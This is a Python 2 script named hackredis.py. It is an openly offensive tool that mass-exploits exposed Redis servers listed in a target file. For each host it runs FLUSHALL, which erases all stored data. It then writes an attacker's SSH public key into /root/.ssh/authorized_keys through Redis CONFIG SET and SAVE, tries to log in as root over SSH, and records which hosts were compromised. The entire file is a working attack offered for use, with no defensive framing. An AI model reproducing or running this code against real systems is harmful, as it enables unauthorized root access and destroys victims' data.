#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -----------------------------------------------------
#  FileName    :    hackredis.py
#  Author      :    wuqingfeng@
#  Date        :    2015-12-11
#  Description :    My Description
# -----------------------------------------------------

import redis
import argparse
import textwrap
import sys
import pexpect

COLOR_NONE = "\033[m"


def getargs():
    parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter,
            description=textwrap.dedent('''\
            For Example:
            -------------------------------------------------
            python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22'''))

    parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target')
    parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port')
    parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate')
    parser.add_argument('-sp', dest='ssh_port', default=22, type=int, help='the ssh port')

    if (len(sys.argv[1:])/2 != 4):
        sys.argv.append('-h')

    return parser.parse_args()

def hackredis(host, port):
    ck = 0
    try:
        print "[*]Attacking ip:%s" % host
        r = redis.StrictRedis(host=host, port=port, db=0, socket_timeout=10)
        r.flushall()
        r.set('crackit', foo)
        r.config_set('dir', '/root/.ssh/')
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        ck = 1
    except Exception, e:
        print "\033[01;31m[-]\033[m Something wrong with %s" % host
        print e
        write(host, 2)
        ck = 0
    
    if ck == 1:
        check(host)
    else:
        pass

def check(host):
    print "\033[01;33m[*]\033[m check connecting..."
    try:
        ssh = pexpect.spawn('ssh root@%s -p %d' % (host, ssh_port))
        i = ssh.expect('[#\$]', timeout=10)
        if i == 0:
            print "\033[1;34m[+]\033[m Success !"
            write(host, 1)
        else:
            print "pass"
    except:
        print "\033[01;32m[-]\033[m Failed to connect !"
        write(host, 3)

def write(host, suc):
    if suc == 1:
        filesname = 'success.txt'
    elif suc == 2:
        filesname = 'fail.txt'
    elif suc == 3:
        filesname = 'unconnect.txt'
    else:
        pass
    file_object = open(filesname, 'a')
    file_object.write(host+'\n')
    file_object.close()


def main():
    global foo, ssh_port
    paramsargs = getargs()
    try:
        hosts = open(paramsargs.iplist, 'r')
        #print hosts
    except(IOError):
        print "Error: check your hostfile path\n"
        sys.exit(1)
    port = paramsargs.port
    ssh_port = paramsargs.ssh_port
    try:
        foo = '\n\n\n' + open(paramsargs.id_rsafile, 'r').readline() + '\n\n\n'
    except(IOError):
        print "Error: check your wordlist path\n"
        sys.exit(1)

    ips = [p.replace('\n', '') for p in hosts]
    for ip in ips:
        hackredis(ip.strip(), port)


if __name__=="__main__":
    main()
            
